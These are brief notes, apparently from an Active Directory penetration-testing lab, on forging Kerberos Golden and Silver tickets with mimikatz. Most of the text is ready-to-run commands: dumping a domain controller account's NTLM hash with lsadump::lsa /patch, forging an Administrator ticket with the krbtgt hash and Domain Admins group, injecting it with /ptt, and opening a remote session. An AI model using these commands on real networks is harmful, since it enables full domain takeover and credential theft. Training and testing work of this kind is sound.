Golden Ticket:

get the NTLM hash of the Administrator / krbtgt, with krbtgt you can impersonate the administrator's token

kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /krbtgt:hash /sid:SID id:500(id that mimikatz presents) /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt (/ptt is not touching the disk, /ticket does.)

you can Enter-PSSession after that.

Silver Ticket:

To get the service's NTLM hash just run lsadump::lsa /patch and it's the main account (in this case, DCORP-DC$)

kerberos::golden /domain:dollarcorp.moneycorp.local /sid:SID /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST/CIFS /rc4:ServiceNTLM /user:Administrator /ptt
